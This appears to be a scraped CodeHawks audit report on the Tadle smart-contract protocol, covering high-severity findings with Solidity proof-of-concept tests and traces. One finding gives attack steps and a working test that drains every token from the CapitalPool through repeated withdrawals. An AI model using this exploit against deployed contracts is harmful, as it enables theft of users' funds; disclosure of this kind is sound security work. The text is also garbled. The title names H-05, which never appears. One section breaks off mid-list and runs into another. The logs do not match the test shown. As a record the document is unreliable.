# H-05 - DeliveryPlace::settleAskTaker Has Incorrect Access Control

**Severity:** high
**Auditor:** CodeHawks
**Protocol:** Tadle
**Keywords:** settleAskTaker, access, control, stock, authority, offer, function, caller, revert, unauthorized, transaction, points, documentation, check, code, test, error, functionality, market

---

**Sponsor:** Tadle  
**Dates:** Aug 5th, 2024 - Aug 12th, 2024  
See more contest details [here](https://codehawks.cyfrin.io/c/2024-08-tadle)  

## Results Summary
**Number of findings:**  
- High: 14  
- Medium: 3  
- Low: 21  

## High Risk Findings
# H-01. Incorrect set up and logic of referralInfoMap in SystemConfig::updateReferrerInfo function
Submitted by [auditweiler](https://profiles.cyfrin.io/u/auditweiler), [4rdiii](https://profiles.cyfrin.io/u/4rdiii), [shaflow01](https://profiles.cyfrin.io/u/shaflow01), [shaka](https://profiles.cyfrin.io/u/shaka), [topstar](https://profiles.cyfrin.io/u/topstar), [0x5chn0uf](https://profiles.cyfrin.io/u/0x5chn0uf), [anusoff](https://profiles.cyfrin.io/u/anusoff), [ravikiranweb3](https://profiles.cyfrin.io/u/ravikiranweb3), [p0wd3r](https://profiles.cyfrin.io/u/p0wd3r), [n0kto](https://profiles.cyfrin.io/u/n0kto), [azariah239](https://profiles.cyfrin.io/u/azariah239), [wellbyt3](https://profiles.cyfrin.io/u/wellbyt3), [pandasec](https://profiles.cyfrin.io/u/pandasec), [touthang](https://profiles.cyfrin.io/u/touthang), [Tomas0707](https://profiles.cyfrin.io/u/Tomas0707), [danielarmstrong](https://profiles.cyfrin.io/u/danielarmstrong), [adeolu](https://profiles.cyfrin.io/u/adeolu), [jesjupyter](https://profiles.cyfrin.io/u/jesjupyter), [eeyore](https://profiles.cyfrin.io/u/eeyore), [gajiknownnothing](https://profiles.cyfrin.io/u/gajiknownnothing), [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [h2134](https://profiles.cyfrin.io/u/h2134), [100HP](https://codehawks.cyfrin.io/team/clzlerf3j0009onp0zvsoyzzl), [0xbeastboy](https://profiles.cyfrin.io/u/0xbeastboy), [ke1cam](https://profiles.cyfrin.io/u/ke1cam), [karanel](https://profiles.cyfrin.io/u/karanel), [irondevx](https://profiles.cyfrin.io/u/irondevx), [0xpep7](https://profiles.cyfrin.io/u/0xpep7), [y4y](https://profiles.cyfrin.io/u/y4y), [pelz](https://profiles.cyfrin.io/u/pelz), [0xnbvc](https://profiles.cyfrin.io/u/0xnbvc), [0xHunter](https://profiles.cyfrin.io/u/0xHunter), [MinhTriet](https://profiles.cyfrin.io/u/MinhTriet), [n08ita](https://profiles.cyfrin.io/u/n08ita), [kiteweb3](https://profiles.cyfrin.io/u/kiteweb3), [Hrom131](https://profiles.cyfrin.io/u/Hrom131), [mikebello](https://profiles.cyfrin.io/u/mikebello), [izuman](https://profiles.cyfrin.io/u/izuman), [sabit](https://profiles.cyfrin.io/u/sabit), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [chaossr](https://profiles.cyfrin.io/u/chaossr), [fyamf](https://profiles.cyfrin.io/u/fyamf), [mattjenkins](https://profiles.cyfrin.io/u/mattjenkins), [typical_human](https://profiles.cyfrin.io/u/typical_human), [praise03](https://profiles.cyfrin.io/u/praise03), [745fe9f9c2](https://profiles.cyfrin.io/u/745fe9f9c2), [0xb0k0](https://profiles.cyfrin.io/u/0xb0k0), [dadekuma](https://profiles.cyfrin.io/u/dadekuma), [ivanfitro](https://profiles.cyfrin.io/u/ivanfitro), [rio1101](https://profiles.cyfrin.io/u/rio1101), [vineyard](https://profiles.cyfrin.io/u/vineyard), [robertodf99](https://profiles.cyfrin.io/u/robertodf99), [emanherawy](https://profiles.cyfrin.io/u/emanherawy), [octeezy](https://profiles.cyfrin.io/u/octeezy), [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake), [turvec](https://profiles.cyfrin.io/u/turvec), [josh4324](https://profiles.cyfrin.io/u/josh4324), [pro_king](https://profiles.cyfrin.io/u/pro_king), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [brene](https://profiles.cyfrin.io/u/brene), [seersec](https://profiles.cyfrin.io/u/seersec), [decap](https://profiles.cyfrin.io/u/decap), [marswhitehacker](https://profiles.cyfrin.io/u/marswhitehacker), [MSaptarshi007](https://profiles.cyfrin.io/u/MSaptarshi007), [Chad0](https://profiles.cyfrin.io/u/Chad0), [Zealynx](https://codehawks.cyfrin.io/team/clt8owsuc0001dt11do7vyoi3), [Fortis Audits](https://codehawks.cyfrin.io/team/cly2eas2s000gpgez427qfcw9), [ast3ros](https://profiles.cyfrin.io/u/ast3ros), [VaRuN](https://profiles.cyfrin.io/u/VaRuN), [pina](https://profiles.cyfrin.io/u/pina), [nikhil20](https://profiles.cyfrin.io/u/nikhil20), [baz1ka](https://profiles.cyfrin.io/u/baz1ka), [rbserver](https://profiles.cyfrin.io/u/rbserver), [bkweb3](https://profiles.cyfrin.io/u/bkweb3), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [shahilhussain](https://profiles.cyfrin.io/u/shahilhussain), [ge6a](https://profiles.cyfrin.io/u/ge6a), [zukanopro](https://profiles.cyfrin.io/u/zukanopro), [recursiveeth](https://profiles.cyfrin.io/u/recursiveeth), [dinkras](https://profiles.cyfrin.io/u/dinkras), [simon0417](https://profiles.cyfrin.io/u/simon0417), [0x1912](https://profiles.cyfrin.io/u/0x1912), [hunter_w3b](https://profiles.cyfrin.io/u/hunter_w3b), [kamensec](https://profiles.cyfrin.io/u/kamensec), [0xspryon](https://profiles.cyfrin.io/u/0xspryon), [honour](https://profiles.cyfrin.io/u/honour), [456456](https://profiles.cyfrin.io/u/456456), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169), [0xrolko](https://profiles.cyfrin.io/u/0xrolko), [bladesec](https://profiles.cyfrin.io/u/bladesec), [zer0](https://profiles.cyfrin.io/u/zer0), [tinnohofficial](https://profiles.cyfrin.io/u/tinnohofficial), [valy001](https://profiles.cyfrin.io/u/valy001), [y0ng0p3](https://profiles.cyfrin.io/u/y0ng0p3), [nilay27](https://profiles.cyfrin.io/u/nilay27), [BaldHeads](https://codehawks.cyfrin.io/team/clzr48l1m0007f5dkdtnxy0wq), [aresaudits](https://profiles.cyfrin.io/u/aresaudits), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [0xrststn](https://profiles.cyfrin.io/u/0xrststn), [pontifex](https://profiles.cyfrin.io/u/pontifex). Selected submission by: [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169).
The vulnerability is present in the \u0060updateReferrerInfo\u0060 function where it allows the caller to set up any arbitrary values for the referrer, referrerRate and authorityRate, as well as the address for which mapping is mapped from is also set to as referrer. As a result of which anyone can maliciously set values for anyone, but where it is expected that the referrer should only be able to set value for the person to whom he is referring.

When a user calls the \u0060updateReferrerInfo\u0060 function, it sets the mapping as \u0060referralInfoMap[referrer]\u0060, and sets up all the values as passed. The referral bonus is allocated during the call to \u0060createTaker\u0060 via \u0060_updateReferralBonus\u0060 function, where it uses the values as: \u0060referralInfoMap[msg.sender]\u0060, where \u0060msg.sender\u0060 is the one to whom referrer has referred to.

The vulnerability occurs due to the fact that the function allows to set the referrer to any arbitrary address by the caller to their own referral, where it was expected that the referrer should be the \u0060msg.sender\u0060 and the caller sets up the mapping\u0027s address from which is mapped to the authority rate which is expected to be passed in the function instead of referrer. Therefore, it was expected that the caller for \u0060updateReferrerInfo\u0060 function should only be the referrer and sets the authority to whom he is referring to.

Incorrect values are set in the \u0060referralInfoMap\u0060 which leads to incorrect allocation in \u0060createTaker\u0060 function\u0027s referral allocation. As a user can call the function with any arbitrary address, therefore they can set up their own other address as referrer where referrer as well as the authority to whom referrer is expected to refer to is set to a single address, so a user gets whole discount on platform fee for both referrer and their own (i.e. authority). Also, anyone can front-run the \u0060updateReferrerInfo\u0060 function before a user calls \u0060createTaker\u0060 and can maliciously update the authorityRate or the referralRate as a result of which the taker will experience different results.

- Manual Review

Make the referrer to call the \u0060updateReferrerInfo\u0060 as \u0060msg.sender\u0060, and pass authority as a parameter to be set up as the one to whom referrer is referring to.

Submitted by [0xrakesh_ummadi28](https://profiles.cyfrin.io/u/0xrakesh_ummadi28), [Hrom131](https://profiles.cyfrin.io/u/Hrom131), [holydevoti0n](https://profiles.cyfrin.io/u/holydevoti0n), [pelz](https://profiles.cyfrin.io/u/pelz), [auditweiler](https://profiles.cyfrin.io/u/auditweiler), [0x5chn0uf](https://profiles.cyfrin.io/u/0x5chn0uf), [4gontuk](https://profiles.cyfrin.io/u/4gontuk), [kevinkkien](https://profiles.cyfrin.io/u/kevinkkien), [typical_human](https://profiles.cyfrin.io/u/typical_human), [shaflow01](https://profiles.cyfrin.io/u/shaflow01), [danielarmstrong](https://profiles.cyfrin.io/u/danielarmstrong), [bengalcatbalu](https://profiles.cyfrin.io/u/bengalcatbalu), [galturok](https://profiles.cyfrin.io/u/galturok), [oxelmiguel](https://profiles.cyfrin.io/u/oxelmiguel), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [lazydog](https://profiles.cyfrin.io/u/lazydog), [danielwang8824](https://profiles.cyfrin.io/u/danielwang8824), [dustinhuel2](https://profiles.cyfrin.io/u/dustinhuel2), [4rdiii](https://profiles.cyfrin.io/u/4rdiii), [touthang](https://profiles.cyfrin.io/u/touthang), [emanherawy](https://profiles.cyfrin.io/u/emanherawy), [greese](https://profiles.cyfrin.io/u/greese), [izcoser](https://profiles.cyfrin.io/u/izcoser), [pyro](https://profiles.cyfrin.io/u/pyro), [adeolu](https://profiles.cyfrin.io/u/adeolu), [kodyvim](https://profiles.cyfrin.io/u/kodyvim), [0xpep7](https://profiles.cyfrin.io/u/0xpep7), [wellbyt3](https://profiles.cyfrin.io/u/wellbyt3), [eeyore](https://profiles.cyfrin.io/u/eeyore), [gajiknownnothing](https://profiles.cyfrin.io/u/gajiknownnothing), [kwakudr](https://profiles.cyfrin.io/u/kwakudr), [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [100HP](https://codehawks.cyfrin.io/team/clzlerf3j0009onp0zvsoyzzl), [abhishekthakur](https://profiles.cyfrin.io/u/abhishekthakur), [0x0n0m4d](https://profiles.cyfrin.io/u/0x0n0m4d), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [4lifemen](https://profiles.cyfrin.io/u/4lifemen), [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful), [n08ita](https://profiles.cyfrin.io/u/n08ita), [karanel](https://profiles.cyfrin.io/u/karanel), [yotov721](https://profiles.cyfrin.io/u/yotov721), [0xswahili](https://profiles.cyfrin.io/u/0xswahili), [irondevx](https://profiles.cyfrin.io/u/irondevx), [0xdarko](https://profiles.cyfrin.io/u/0xdarko), [youleeyan](https://profiles.cyfrin.io/u/youleeyan), [MinhTriet](https://profiles.cyfrin.io/u/MinhTriet), [0xnbvc](https://profiles.cyfrin.io/u/0xnbvc), [0xHunter](https://profiles.cyfrin.io/u/0xHunter), [radin100](https://profiles.cyfrin.io/u/radin100), [p6rkdoye0n](https://profiles.cyfrin.io/u/p6rkdoye0n), [ragnarok](https://profiles.cyfrin.io/u/ragnarok), [0xasp](https://profiles.cyfrin.io/u/0xasp), [aksoy](https://profiles.cyfrin.io/u/aksoy), [bigsam](https://profiles.cyfrin.io/u/bigsam), [demorextess](https://profiles.cyfrin.io/u/demorextess), [kingnull](https://profiles.cyfrin.io/u/kingnull), [4eyes](https://codehawks.cyfrin.io/team/clzp933py000dnn0wn5ui2a7b), [almantare](https://profiles.cyfrin.io/u/almantare), [izuman](https://profiles.cyfrin.io/u/izuman), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [ivanfitro](https://profiles.cyfrin.io/u/ivanfitro), [jesjupyter](https://profiles.cyfrin.io/u/jesjupyter), [oxwhite](https://profiles.cyfrin.io/u/oxwhite), [0bingo76](https://profiles.cyfrin.io/u/0bingo76), [Fortis Audits](https://codehawks.cyfrin.io/team/cly2eas2s000gpgez427qfcw9), [itsabinashb](https://profiles.cyfrin.io/u/itsabinashb), [pina](https://profiles.cyfrin.io/u/pina), [0xcontrol](https://profiles.cyfrin.io/u/0xcontrol), [ZeroProtocol](https://profiles.cyfrin.io/u/ZeroProtocol), [745fe9f9c2](https://profiles.cyfrin.io/u/745fe9f9c2), [dadekuma](https://profiles.cyfrin.io/u/dadekuma), [lumoswiz](https://profiles.cyfrin.io/u/lumoswiz), [waydou](https://profiles.cyfrin.io/u/waydou), [praise03](https://profiles.cyfrin.io/u/praise03), [jprod15](https://profiles.cyfrin.io/u/jprod15), [octeezy](https://profiles.cyfrin.io/u/octeezy), [turvec](https://profiles.cyfrin.io/u/turvec), [0xloscar01](https://profiles.cyfrin.io/u/0xloscar01), [0xaman](https://profiles.cyfrin.io/u/0xaman), [h2134](
Due to the fact that the withdraw function from the TokenManager contract does not reset users\u0027 balances after withdrawals, users can repeat withdrawals from the contract an unlimited number of times, thus stealing funds from other users.

In the withdraw function of the TokenManager contract, it is possible to unlimitedly withdraw tokens from the CapitalPool contract. The withdraw function allows any user to withdraw tokens they have earned on their balance, but the user\u0027s balance is not updated anywhere after the withdrawal. The code for getting the user\u0027s balance:

\u0060\u0060\u0060solidity
uint256 claimAbleAmount = userTokenBalanceMap[_msgSender()][ 
    _tokenAddress 
][_tokenBalanceType]; 
\u0060\u0060\u0060

As an example, let\u0027s consider the simplest scenario of an attack on a system that will exploit the found vulnerability:

1. First, the user needs to make it so that they have some sort of balance within the TokenManager contract.
   1. To do this, it is enough to create an offer using the createOffer function of the PreMarkets contract. During creation, the user will send some tokens as a collateral.
   2. Then it is necessary to abort the offer immediately using the abortAskOffer function of the PreMarkets contract. This abort will add a refund amount to the user\u0027s balance in the TokenManager contract.
2. Send a huge number of transactions, within which there will be a call to the TokenManager contract withdraw function. The number of transactions will depend on how many tokens are inside the CapitalPool contract.

This is the simplest attack option, but it is possible to create a special contract on whose behalf to interact with the protocol. Then the attack can be accomplished in a single transaction, which will be much more efficient.
## Test code that demonstrates the vulnerability described above
To run the test, its code without changes should be placed in the PreMarkets.t.sol file.
It is possible to withdraw absolutely all funds from CapitalPool contract, so this bug is critical.
## Code
\u0060\u0060\u0060solidity
function test_unlimited_withdraw() public { 
    vm.startPrank(user); 
    capitalPool.approve(address(mockUSDCToken)); 
    uint256 userPaidAmount = 12000 * 1e18; 
    preMarktes.createOffer( 
        CreateOfferParams( 
            marketPlace, 
            address(mockUSDCToken), 
            10000, 
            10000 * 1e18, 
            12000, 
            300, 
            OfferType.Ask, 
            OfferSettleType.Turbo 
        ) 
    );
    vm.stopPrank(); 
    assertEq(mockUSDCToken.balanceOf(address(capitalPool)), userPaidAmount); 
    vm.startPrank(user2); 
    uint256 user2PaidAmount = 120 * 1e18; 
    preMarktes.createOffer( 
        CreateOfferParams( 
            marketPlace, 
            address(mockUSDCToken), 
            10000, 
            100 * 1e18, 
            12000, 
            300, 
            OfferType.Ask, 
            OfferSettleType.Turbo 
        ) 
    );
    assertEq(mockUSDCToken.balanceOf(address(capitalPool)), userPaidAmount + user2PaidAmount); 
    address user2OfferAddr = GenerateAddress.generateOfferAddress(1); 
    address user2StockAddr = GenerateAddress.generateStockAddress(1); 
    preMarktes.abortAskOffer(user2StockAddr, user2OfferAddr); 
    assertEq(tokenManager.userTokenBalanceMap(user2, address(mockUSDCToken), TokenBalanceType.MakerRefund), user2PaidAmount); 
    uint256 user2BalanceBefore = mockUSDCToken.balanceOf(user2); 
    for (uint256 i = 0; i < 101; i++) { 
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.MakerRefund); 
    } 
    assertEq(mockUSDCToken.balanceOf(address(capitalPool)), 0); 
    assertEq(mockUSDCToken.balanceOf(user2) - user2BalanceBefore, userPaidAmount + user2PaidAmount); 
    vm.stopPrank(); 
}
\u0060\u0060\u0060
The bug was found by manually auditing the contract code. To validate the vulnerability and demonstrate it, a unit test was written.

Update value in userTokenBalanceMap inside withdraw function.
## H-03
Taker of bid offer will loss assets without any benefit if he calls the DeliveryPlace::settleAskMaker() for partial settlement.

Submitted by [eeyore](https://profiles.cyfrin.io/u/eeyore), [bauchibred](https://profiles.cyfrin.io/u/bauchibred), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [h2134](https://profiles.cyfrin.io/u/h2134), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [fyamf](https://profiles.cyfrin.io/u/fyamf), [dadekuma](https://profiles.cyfrin.io/u/dadekuma), [bigsam](https://profiles.cyfrin.io/u/bigsam), [itsabinashb](https://profiles.cyfrin.io/u/itsabinashb), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [stanchev](https://profiles.cyfrin.io/u/stanchev), [touthang](https://profiles.cyfrin.io/u/touthang), [cheatcode](https://profiles.cyfrin.io/u/cheatcode), [Chad0](https://profiles.cyfrin.io/u/Chad0), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [pascal](https://profiles.cyfrin.io/u/pascal), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [audinarey](https://profiles.cyfrin.io/u/audinarey), [0xb0k0](https://profiles.cyfrin.io/u/0xb0k0), [OdeWeb3](https://codehawks.cyfrin.io/team/cluqfw65k000169faytyphjol), [0xrststn](https://profiles.cyfrin.io/u/0xrststn), [abhishekthakur](https://profiles.cyfrin.io/u/abhishekthakur), [inzinko](https://profiles.cyfrin.io/u/inzinko), [baz1ka](https://profiles.cyfrin.io/u/baz1ka), [kupiasec](https://profiles.cyfrin.io/u/kupiasec), [_frolic](https://profiles.cyfrin.io/u/_frolic), [pavankv](https://profiles.cyfrin.io/u/pavankv), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169). Selected submission by: [itsabinashb](https://profiles.cyfrin.io/u/itsabinashb).

Taker of bid offer will loss point token & collateralFee without any benefit if he calls the DeliveryPlace::settleAskMaker() for partial settlement.

Nothing stops a taker of a bid offer to do partial settlement by calling settleAskTaker(), but partial settlement results loss of collateralFee and Point token for the taker.

NOTE: To execute the PoC given below properly we need to fix 2 issue of this code, I already submitted the report regarding that issue, you can find that issue with this title: Call to settleAskTaker() will fail every time due to wrong authority check. In short you need to correct the authority check in settleAskTaker() by changing it from offerInfo.authority to stockInfo.authority, here (https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/DeliveryPlace.sol#L361). And change the token type from makerInfo.tokenAddress to marketPlaceInfo.tokenAddress, here (https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/DeliveryPlace.sol#L387), I have already submitted the issue, you can find that with this title: Wrong token is added to userTokenBalanceMap due to incorrect argument. I hope you fixed that issue, now lets run the PoC in Premarkets.t.sol contract:
## Test No Benefit

\u0060\u0060\u0060solidity
function test_noBenefit() public { 
    deal(address(mockPointToken), address(user4), 100e18); 
    //@audit User creating a Bid offer, to buy 1000 point 
    vm.startPrank(user); 
    preMarktes.createOffer( 
        CreateOfferParams( 
            marketPlace, 
            address(mockUSDCToken), 
            1000, 
            0.01 * 1e18, 
            12000, 
            300, 
            OfferType.Bid, 
            OfferSettleType.Turbo 
        ) 
    );
    vm.stopPrank(); 
    //@audit User4 created a stock to sell 500 point to user\u0027s Bid offer 
    vm.startPrank(user4); 
    address offerAddr = GenerateAddress.generateOfferAddress(0); 
    preMarktes.createTaker(offerAddr, 500); 
    address stock1Addr = GenerateAddress.generateStockAddress(1); 
    vm.stopPrank(); 
    //@audit updateMarket() is called to set the timestamp in \u0027settlementPeriod\u0027 i.e tge was done 
    // & we are in now settlementPeriod 
    vm.startPrank(user1); 
    systemConfig.updateMarket( 
        "Backpack", 
        address(mockPointToken), 
        0.01 * 1e18, 
        block.timestamp - 1, 
        3600 
    );
    //@audit updating the marketPlaceStatus to AskSettling 
    systemConfig.updateMarketPlaceStatus( 
        "Backpack", 
        MarketPlaceStatus.AskSettling 
    );
    vm.stopPrank(); 
    //@audit Now the user came & closed the Bid offer 
    vm.prank(user); 
    deliveryPlace.closeBidOffer(offerAddr); 
    vm.startPrank(user4); 
    //@audit user4 tried to settle his Ask type stock so that he can sell points to the user 
    mockPointToken.approve(address(tokenManager), 10000 * 10 ** 18); 
    uint pointTokenBalancePrevious = mockPointToken.balanceOf(user4); 
    uint usdcTokenBalancePrevious = mockUSDCToken.balanceOf(user4); 
    console2.log( 
        "Point token balance of user4 before settling: ", 
        pointTokenBalancePrevious 
    );
    console2.log( 
        "USDC token balance of user4 before settling: ", 
        usdcTokenBalancePrevious 
    );
    console2.log( 
        "USDC token balance of user before settling: ", 
        mockUSDCToken.balanceOf(address(user)) 
    );
}
\u0060\u0060\u0060
## Logs
\u0060\u0060\u0060
Point token balance of user4 before settling:  100000000000000000000 
USDC token balance of user4 before settling:  99999999993825000000000000 
USDC token balance of user before settling:  99999999990000000000000000 
Point token balance of user before settling:  100000000000000000000000000 
USDC token balance of user after settling:  100000000001000000000000000 
Point token balance of user after settling:  100000003000000000000000000 
USDC token balance of user4 after settling:  99999999993825000000000000 
Point token balance of user4 after settling:  97000000000000000000 
\u0060\u0060\u0060

Here you can see as the user4 called the \u0060settleAskTaker()\u0060 for partial settlement the Point was deducted from his balance, because before settlement his point token balance was: \u0060100000000000000000000\u0060 but after settlement his point token balance came to: \u006097000000000000000000\u0060. But for this partial settlement he should have got USDC according to his settlement amount but he did not get anything, before settlement his USDC token balance was: \u006099999999993825000000000000\u0060 & after settlement his USDC token balance: \u006099999999993825000000000000\u0060 which is same. But if you notice the offer owner Point token balance and USDC token balance, both increased.

The taker of a bid offer will lose his point token and collateralFee if he calls the \u0060settleAskMaker()\u0060 for partial settlement.

## Tool Used
Manual review, Foundry
It could be design decission to not allow any taker for partial settlement, but if so then the protocol should revert the call immediately if the settlement is partial, so that the taker do not loss his tokens.

## Related Links
[DeliveryPlace.sol](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/DeliveryPlace.sol#L335)
## H-04. Native token withdrawal fails until manually approved
Submitted by [juan](https://profiles.cyfrin.io/u/juan), [holydevoti0n](https://profiles.cyfrin.io/u/holydevoti0n), [0x5chn0uf](https://profiles.cyfrin.io/u/0x5chn0uf), [auditweiler](https://profiles.cyfrin.io/u/auditweiler), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [0xlrivo](https://profiles.cyfrin.io/u/0xlrivo), [shaflow01](https://profiles.cyfrin.io/u/shaflow01), [bengalcatbalu](https://profiles.cyfrin.io/u/bengalcatbalu), [danielwang8824](https://profiles.cyfrin.io/u/danielwang8824), [oxelmiguel](https://profiles.cyfrin.io/u/oxelmiguel), [p0wd3r](https://profiles.cyfrin.io/u/p0wd3r), [v1vah0us3](https://profiles.cyfrin.io/u/v1vah0us3), [4rdiii](https://profiles.cyfrin.io/u/4rdiii), [n0kto](https://profiles.cyfrin.io/u/n0kto), [4lifemen](https://profiles.cyfrin.io/u/4lifemen), [Tomas0707](https://profiles.cyfrin.io/u/Tomas0707), [danielarmstrong](https://profiles.cyfrin.io/u/danielarmstrong), [izcoser](https://profiles.cyfrin.io/u/izcoser), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [matrox](https://profiles.cyfrin.io/u/matrox), [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful), [0xpep7](https://profiles.cyfrin.io/u/0xpep7), [eeyore](https://profiles.cyfrin.io/u/eeyore), [adeolu](https://profiles.cyfrin.io/u/adeolu), [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [lazydog](https://profiles.cyfrin.io/u/lazydog), [ragnarok](https://profiles.cyfrin.io/u/ragnarok), [ke1cam](https://profiles.cyfrin.io/u/ke1cam), [tinnohofficial](https://profiles.cyfrin.io/u/tinnohofficial), [irondevx](https://profiles.cyfrin.io/u/irondevx), [MinhTriet](https://profiles.cyfrin.io/u/MinhTriet), [0xnbvc](https://profiles.cyfrin.io/u/0xnbvc), [0xHunter](https://profiles.cyfrin.io/u/0xHunter), [mikebello](https://profiles.cyfrin.io/u/mikebello), [aksoy](https://profiles.cyfrin.io/u/aksoy), [wickie](https://profiles.cyfrin.io/u/wickie), [demorextess](https://profiles.cyfrin.io/u/demorextess), [ivanfitro](https://profiles.cyfrin.io/u/ivanfitro), [izuman](https://profiles.cyfrin.io/u/izuman), [almantare](https://profiles.cyfrin.io/u/almantare), [fyamf](https://profiles.cyfrin.io/u/fyamf), [itsabinashb](https://profiles.cyfrin.io/u/itsabinashb), [pina](https://profiles.cyfrin.io/u/pina), [0xleadwizard](https://profiles.cyfrin.io/u/0xleadwizard), [rio1101](https://profiles.cyfrin.io/u/rio1101), [praise03](https://profiles.cyfrin.io/u/praise03), [turvec](https://profiles.cyfrin.io/u/turvec), [0xaman](https://profiles.cyfrin.io/u/0xaman), [abhishekthakur](https://profiles.cyfrin.io/u/abhishekthakur), [hunter_w3b](https://profiles.cyfrin.io/u/hunter_w3b), [marswhitehacker](https://profiles.cyfrin.io/u/marswhitehacker), [h2134](https://profiles.cyfrin.io/u/h2134), [bkweb3](https://profiles.cyfrin.io/u/bkweb3), [atharv181](https://profiles.cyfrin.io/u/atharv181), [baz1ka](https://profiles.cyfrin.io/u/baz1ka), [rbserver](https://profiles.cyfrin.io/u/rbserver), [Chad0](https://profiles.cyfrin.io/u/Chad0), [dinkras](https://profiles.cyfrin.io/u/dinkras), [0xsecuri](https://profiles.cyfrin.io/u/0xsecuri), [amaron](https://profiles.cyfrin.io/u/amaron), [ge6a](https://profiles.cyfrin.io/u/ge6a), [0xphantom](https://profiles.cyfrin.io/u/0xphantom), [0x1912](https://profiles.cyfrin.io/u/0x1912), [tnevler](https://profiles.cyfrin.io/u/tnevler), [Ward](https://codehawks.cyfrin.io/team/clr5ch8nz0001whgxzd0o1ecx), [0xshoonya](https://profiles.cyfrin.io/u/0xshoonya), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169), [air](https://profiles.cyfrin.io/u/air), [recursiveeth](https://profiles.cyfrin.io/u/recursiveeth), [0xrststn](https://profiles.cyfrin.io/u/0xrststn), [honour](https://profiles.cyfrin.io/u/honour), [bladesec](https://profiles.cyfrin.io/u/bladesec), [dimah7](https://profiles.cyfrin.io/u/dimah7), [kupiasec](https://profiles.cyfrin.io/u/kupiasec), [dipp](https://profiles.cyfrin.io/u/dipp), [kamensec](https://profiles.cyfrin.io/u/kamensec), [0xmakeouthill](https://profiles.cyfrin.io/u/0xmakeouthill), [gkrastenov](https://profiles.cyfrin.io/u/gkrastenov), [_frolic](https://profiles.cyfrin.io/u/_frolic), [nilay27](https://profiles.cyfrin.io/u/nilay27), [Audittens](https://profiles.cyfrin.io/u/Audittens), [azanux](https://profiles.cyfrin.io/u/azanux), [audinarey](https://profiles.cyfrin.io/u/audinarey), [0xb0k0](https://profiles.cyfrin.io/u/0xb0k0), [sakar](https://profiles.cyfrin.io/u/sakar). Selected submission by: [izcoser](https://profiles.cyfrin.io/u/izcoser).

TokenManager::withdraw uses a spending allowance on the capital pool to move its funds. When doing a withdrawal, the internal function TokerManager::_transfer checks for this allowance and attempts to approve spending, but incorrectly passes address(this) instead of the token address. Hence, withdrawal fails.

Let us use a simple example of creating an offer, closing it and attempting to withdraw.
## Approval Failure in TokenManager

\u0060\u0060\u0060solidity
function test_native_token_withdrawal_fails() public { 
    deal(user, INITIAL_TOKEN_VALUE); 
    vm.startPrank(user); 
    preMarktes.createOffer{value: 0.012 * 1e18}( 
        CreateOfferParams( 
            marketPlace, 
            address(weth9), 
            1000, 
            0.01 * 1e18, 
            12000, 
            300, 
            OfferType.Ask, 
            OfferSettleType.Turbo 
        ) 
    );
    // Close the offer. 
    address offerAddr = GenerateAddress.generateOfferAddress(0); 
    address stockAddr = GenerateAddress.generateStockAddress(0); 
    preMarktes.closeOffer(stockAddr, offerAddr); 
    tokenManager.withdraw(address(weth9), TokenBalanceType.MakerRefund); 
    vm.stopPrank(); 
}
\u0060\u0060\u0060

We get:
\u0060\u0060\u0060
│   │   ├─ [9999] UpgradeableProxy::approve(UpgradeableProxy: [0x6891e60906DEBeA401F670D74d01D117a3bEAD39]) 
│   │   │   ├─ [4983] CapitalPool::approve(UpgradeableProxy: [0x6891e60906DEBeA401F670D74d01D117a3bEAD39]) [delegatecall] 
│   │   │   │   ├─ [534] TadleFactory::relatedContracts(5) [staticcall] 
│   │   │   │   │   └─ ← [Return] UpgradeableProxy: [0x6891e60906DEBeA401F670D74d01D117a3bEAD39] 
│   │   │   │   ├─ [708] UpgradeableProxy::approve(UpgradeableProxy: [0x6891e60906DEBeA401F670D74d01D117a3bEAD39], 11579208923731
│   │   │   │   │   ├─ [192] TokenManager::approve(UpgradeableProxy: [0x6891e60906DEBeA401F670D74d01D117a3bEAD39], 11579208923731
│   │   │   │   │   │   └─ ← [Revert] EvmError: Revert 
│   │   │   │   │   └─ ← [Revert] EvmError: Revert 
│   │   │   │   └─ ← [Revert] ApproveFailed() 
\u0060\u0060\u0060

This approve fails because we\u0027re calling approve on a non-ERC20 contract, the function simply does not exist.

Here is the mistake, in TokenManager::_transfer:
\u0060\u0060\u0060solidity
function _transfer( 
    address _token, 
    address _from, 
    address _to, 
    uint256 _amount, 
    address _capitalPoolAddr 
) internal { 
    uint256 fromBalanceBef = IERC20(_token).balanceOf(_from); 
    uint256 toBalanceBef = IERC20(_token).balanceOf(_to); 
    if ( 
        _from == _capitalPoolAddr && 
        IERC20(_token).allowance(_from, address(this)) == 0x0 
    ) { 
        ICapitalPool(_capitalPoolAddr).approve(address(this)); 
    } 
}
\u0060\u0060\u0060

\u0060address(this)\u0060 is TokenManager itself, but CapitalPool::approve expects a token address.

**Impact**
